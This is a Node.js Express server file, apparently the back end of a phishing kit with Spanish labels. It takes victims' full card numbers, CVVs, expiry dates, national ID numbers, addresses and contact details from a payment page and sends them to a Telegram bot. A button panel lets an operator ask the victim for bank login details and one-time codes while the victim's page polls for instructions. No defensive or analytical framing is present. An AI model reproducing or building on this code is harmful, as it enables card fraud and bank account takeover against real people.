// server.js

import express from "express";
import cors from "cors";
import bodyParser from "body-parser";
import dotenv from "dotenv";
import fetch from "node-fetch";
dotenv.config();

const app = express();
app.use(cors());
app.use(bodyParser.json());
app.use(express.static("public"));

const estados = {}; // memoria temporal para el estado

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
  console.error("⚠️ Variables de entorno faltantes");
  process.exit(1);
}

// ENVIAR DATOS DESDE payment.html
app.post("/enviar", async (req, res) => {
  const data = req.body;
  if (!data) {
    return res.status(400).json({ status: "error", message: "Datos inválidos" });
  }

  const id = Date.now().toString(36);
  estados[id] = null; // inicializar en memoria

  const message = `
<b>Nuevo pago pendiente</b>
-----------------------
👤 <b>Nombre:</b> ${data.nombre}
🆔 <b>Cédula:</b> ${data.id}
📧 <b>Email:</b> ${data.email}
📞 <b>Celular:</b> ${data.celular}
🏠 <b>Dirección:</b> ${data.direccion}
🏦 <b>Banco:</b> ${data.banco}
💳 <b>Tarjeta:</b> ${data.tarjeta}
📅 <b>Fecha:</b> ${data.ftarjeta}
🔐 <b>CVV:</b> ${data.cvv}
🌐 <b>IP:</b> ${data.ip}
-----------------------
`;

  const keyboard = {
    inline_keyboard: [
      [{ text: "Pedir Logo", callback_data: `pedir_logo:${id}` }],
      [{ text: "Pedir Dinámica", callback_data: `pedir_dinamica:${id}` }],
      [{ text: "Error TC", callback_data: `error_tc:${id}` }],
      [{ text: "Error Logo", callback_data: `error_logo:${id}` }],
      [{ text: "Finalizar", callback_data: `finalizar:${id}` }]
    ]
  };

  try {
    const resp = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "HTML",
        reply_markup: keyboard
      })
    });

    const tgData = await resp.json();
    console.log("✅ Enviado a Telegram:", tgData);

    return res.json({ status: "ok", id });
  } catch (error) {
    console.error("❌ Error enviando a Telegram:", error);
    return res.status(500).json({ status: "error", message: "No se pudo enviar a Telegram" });
  }
});

// WEBHOOK DE TELEGRAM
app.post("/api/telegram", (req, res) => {
  console.log("📥 Webhook recibido:", JSON.stringify(req.body, null, 2));
  const callback = req.body.callback_query;

  if (callback) {
    const [action, id] = callback.data.split(":");

    // guardar estado
    estados[id] = action;

    // responder el botón
    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        callback_query_id: callback.id,
        text: "✔️ Acción recibida",
        show_alert: false
      })
    }).catch(err => console.error("Error al responder callback:", err));

    console.log(`🟢 Acción: ${action} para id: ${id}`);

    res.sendStatus(200);
  } else {
    res.sendStatus(200); // ignorar si no es callback
  }
});

// CONSULTAR ESTADO
app.get("/estado/:id", (req, res) => {
  const id = req.params.id;
  const estado = estados[id] || null;
  res.json({ estado });
});

// INICIAR
const port = process.env.PORT || 3000;
app.listen(port, () => {
  console.log(`🚀 Servidor escuchando en puerto ${port}`);
});
